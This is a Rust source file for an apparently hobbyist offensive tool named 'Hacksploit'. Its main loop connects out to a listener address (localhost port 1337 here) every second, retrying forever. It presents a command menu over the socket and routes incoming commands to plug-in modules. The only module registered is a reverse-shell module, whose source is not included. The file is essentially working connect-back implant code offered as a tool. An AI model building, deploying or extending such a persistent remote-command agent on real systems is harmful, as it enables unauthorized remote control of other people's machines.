use std::boxed::Box;
use std::io::{Error, Read, Write};
use std::net::TcpStream;

use modules::reverse_shell::ReverseShellModule;

mod modules;

const WELCOME_MESSAGE: &str = "hey babes thanks for using this thing\n";
const HELP_MESSAGE: &str = "so here's the help: \n{ENTRIES}\n";
const EXIT_MESSAGE: &str = "oh :-( bye\n";
const UNKNOWN_COMMAND: &str = "Unknown command. Please try again.\n";

pub trait HacksploitModule {
    fn on_command(&self, args: Vec<&str>) -> String;
    fn get_name(&self) -> String;
    fn get_description(&self) -> String;
}

pub struct HacksploitInstance {
    modules: Vec<Box<dyn HacksploitModule>>,
    welcome_message: String,
    help_message: String,
    exit_message: String,
}

impl HacksploitInstance {
    pub fn new() -> Self {
        HacksploitInstance {
            modules: vec![],
            welcome_message: String::from(WELCOME_MESSAGE),
            help_message: String::from(HELP_MESSAGE),
            exit_message: String::from(EXIT_MESSAGE),
        }
    }

    pub fn register_module<T>(&mut self, module: T)
    where
        T: HacksploitModule + 'static,
    {
        self.modules.push(Box::new(module));
    }

    fn on_command(&self, data: String) -> String {
        let arr: Vec<&str> = data.split_whitespace().collect();
        let command = arr.get(0);
        if command.is_none() {
            return String::new();
        }
        let command = command.unwrap();
        let args = arr[1..].to_vec();
        for module in &self.modules {
            if command.eq_ignore_ascii_case(&module.get_name()) {
                return module.on_command(args);
            }
        }
        String::new()
    }

    fn get_welcome_message(&self) -> String {
        String::from(&self.welcome_message)
    }

    fn get_help_message(&self) -> String {
        let mut entries: Vec<String> = vec![];
        for module in &self.modules {
            let entry_text = vec![
                module.get_name().as_str(),
                "-",
                module.get_description().as_str(),
            ]
            .join(" ");
            entries.push(entry_text);
        }
        let entries = entries.join("\n");
        String::from(&self.help_message.replace("{ENTRIES}", &entries))
    }

    fn get_exit_message(&self) -> String {
        String::from(&self.exit_message)
    }
}

fn main() {
    let interval = std::time::Duration::from_secs(1);
    loop {
        match start("127.0.0.1:1337") {
            Ok(_) => (),
            Err(e) => println!("Error: {}", e),
        }
        std::thread::sleep(interval);
    }
}

fn start(addr: &str) -> Result<(), Error> {
    let mut stream: TcpStream = TcpStream::connect(addr)?;
    let mut instance: HacksploitInstance = HacksploitInstance::new();
    register_modules(&mut instance);
    stream.write(instance.get_welcome_message().as_bytes())?;
    stream.flush()?;
    loop {
        let mut buf = [0; 1024];

        stream.write(instance.get_help_message().as_bytes())?;
        stream.flush()?;

        let len = stream.read(&mut buf)?;
        if len == 0 {
            break;
        }
        let data = String::from_utf8(buf[..len].to_vec());
        match data {
            Ok(data) => {
                if data.to_ascii_lowercase().starts_with("exit") {
                    let response = instance.get_exit_message();
                    let _ = stream.write(response.as_bytes());
                    let _ = stream.flush();
                    break;
                }
                let mut response = instance.on_command(data);
                if response.len() == 0 {
                    response = String::from(UNKNOWN_COMMAND);
                }
                stream.write(response.as_bytes())?;
                stream.flush()?;
            }
            Err(_) => break,
        }
    }
    Ok(())
}
fn register_modules(instance: &mut HacksploitInstance) {
    let reverse_shell = ReverseShellModule::new();
    instance.register_module(reverse_shell);
}
